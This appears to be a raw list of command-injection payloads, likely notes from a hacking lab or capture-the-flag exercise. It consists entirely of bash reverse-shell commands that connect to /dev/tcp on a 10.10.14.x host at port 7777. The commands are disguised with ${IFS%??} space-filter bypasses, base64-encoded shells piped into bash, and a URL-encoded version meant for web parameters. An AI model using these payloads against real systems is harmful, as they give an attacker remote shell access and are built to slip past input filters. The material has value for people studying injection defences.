${IFS%??},;echo${IFS%??},;"bash${IFS%??},;-i${IFS%??},;>&${IFS%??},;/dev/tcp/10.10.14.4/7777${IFS%??},;0>&1"${IFS%??},;|${IFS%??},;base64${IFS%??},;-w${IFS%??},;0${IFS%??},;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==${IFS%??},;

;echo${IFS%??},;"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg=="${IFS%??},;|${IFS%??},;base64${IFS%??},;-d${IFS%??},;|${IFS%??},;bash;

%24%7BIFS%25%3F%3F%7D%2C%3Becho%24%7BIFS%25%3F%3F%7D%2C%3B%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg%3D%3D%22%24%7BIFS%25%3F%3F%7D%2C%3B%7C%24%7BIFS%25%3F%3F%7D%2C%3Bbase64%24%7BIFS%25%3F%3F%7D%2C%3B-d%24%7BIFS%25%3F%3F%7D%2C%3B%7C%24%7BIFS%25%3F%3F%7D%2C%3Bbash%3B

bash -i >& /dev/tcp/10.10.14.4/7777 0>&1


${IFS%??}

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Lzc3NzcgMD4mMQo="|base64${IFS%??}-d|bash;